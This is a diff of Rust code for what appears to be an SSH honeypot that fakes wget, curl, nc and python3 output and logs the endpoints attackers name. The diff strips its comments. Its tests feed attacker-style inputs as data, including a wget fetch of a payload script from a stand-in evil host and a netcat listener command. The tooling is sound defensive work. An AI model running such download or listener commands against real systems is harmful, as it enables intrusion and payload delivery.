@@ -1,16 +1,3 @@
-//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`, `nc`, and
-//! the `python3`/`perl` invocation stubs.
-//!
-//! None of these touch the real network. They render believable output and
-//! record every remote endpoint an attacker named as a [`Capture`] for forensic
-//! logging; `wget`/`curl` additionally drop a placeholder file into the
-//! in-memory VFS.
-//!
-//! The interpreters live here because that is what they are used for: a
-//! `python3 -c` one-liner in an SSH session is a reverse shell far more often
-//! than it is anything else, and it is captured the same way a `wget` URL is.
-//! Nothing is ever interpreted — see [`python3`].
-
 use std::net::Ipv4Addr;
 
 use crate::shell::{Capture, Shell};
@@ -33,8 +20,6 @@ const STDOUT_DESTINATION: &str = "-";
 const FNV1A_32_OFFSET_BASIS: u32 = 2166136261;
 const FNV1A_32_PRIME: u32 = 16777619;
 
-/// A deterministic but plausible "resolved" address for any hostname, so repeat
-/// lookups in a session stay consistent without performing real DNS.
 fn fake_resolve(host: &str) -> String {
     if host == "localhost" {
         return Ipv4Addr::LOCALHOST.to_string();
@@ -45,7 +30,7 @@ fn fake_resolve(host: &str) -> String {
     let h = host.bytes().fold(FNV1A_32_OFFSET_BASIS, |h, b| {
         (h ^ b as u32).wrapping_mul(FNV1A_32_PRIME)
     });
-    // Map into a public-looking range, avoiding .0/.255 octets.
+
     let octet = |shift: u32| (h >> shift) % 254 + 1;
     format!(
         "{}.{}.{}.{}",
@@ -82,8 +67,7 @@ mod tests {
         let out = run(&mut shell, "wget http://evil.example/payload.sh");
         assert!(out.contains("200 OK"));
         assert!(out.contains("saved"));
-        // A structured download capture is recorded (check before the next
-        // command, which would clear it).
+
         assert_eq!(shell.captures.len(), 1);
         match &shell.captures[0] {
             Capture::Download { tool, url, .. } => {
@@ -92,7 +76,7 @@ mod tests {
             }
             other => panic!("expected a Download capture, got {other:?}"),
         }
-        // File materialises in cwd.
+
         assert!(run(&mut shell, "ls").contains("payload.sh"));
     }
 
@@ -104,8 +88,6 @@ mod tests {
         assert!(run(&mut shell, "ls").contains("mal.bin"));
     }
 
-    /// The transfer's reported size has to match the file it leaves behind:
-    /// "saved [1394/1394]" next to a 0-byte file is a one-command tell.
     #[test]
     fn downloaded_file_matches_the_reported_size() {
         for (tool, cmd, name) in [
@@ -166,8 +148,7 @@ mod tests {
             "{}",
             result.stderr
         );
-        // The endpoint is worth as much as a wget URL and lands in the same
-        // capture channel, so one query finds every remote host a session named.
+
         assert!(shell.captures.iter().any(|c| matches!(
             c,
             Capture::Download { tool, url, .. }
@@ -178,9 +159,7 @@ mod tests {
     #[test]
     fn nc_listen_matches_what_debian_actually_does() {
         let mut shell = Shell::new("root", "debian");
-        // Debian 12 ships netcat-openbsd, which really does refuse `-p` with
-        // `-l` — and `nc -lvp PORT` is the syntax attackers carry over from
-        // netcat-traditional.
+
         let result = shell.execute("nc -lvp 4444");
         assert_eq!(result.status, 1);
         assert!(result.stderr.contains("cannot use -p and -l"));
@@ -196,9 +175,6 @@ mod tests {
             "nc -l should hold the screen on a terminal"
         );
 
-        // A pipe, a redirect, and a one-shot `exec` are not a terminal: a
-        // real listener backgrounded with no controlling tty does not hold
-        // one either.
         run(&mut shell, "nc -l 4444 | cat");
         assert!(shell.screen.is_none(), "a pipe should not hold the screen");
         run(&mut shell, "nc -l 4444 > /tmp/out");
@@ -234,20 +210,15 @@ mod tests {
     #[test]
     fn python3_runs_nothing_and_says_so_consistently() {
         let mut shell = Shell::new("root", "debian");
-        // A non-network one-liner exits quietly: inventing output for code that
-        // was never run would be a fabrication, not an emulation.
+
         let quiet = shell.execute("python3 -c 'print(1+1)'");
         assert_eq!(quiet.status, 0);
         assert_eq!(quiet.stdout, "");
 
-        // The version must match what `dpkg -l` reports, or one command
-        // contradicts the other.
         let version = shell.execute("python3 --version");
         assert_eq!(version.stdout.trim(), "Python 3.11.2");
         assert!(shell.execute("dpkg -l").stdout.contains("3.11.2"));
 
-        // A script that was never dropped gets the real error, with the
-        // absolute path python reports rather than the operand.
         let missing = shell.execute("python3 /tmp/nope.py");
         assert_eq!(missing.status, 2);
         assert!(
@@ -256,7 +227,6 @@ mod tests {
             missing.stderr
         );
 
-        // Debian 12 has no /usr/bin/python, only python3.
         assert_eq!(shell.execute("python -c 'pass'").status, 127);
     }
 
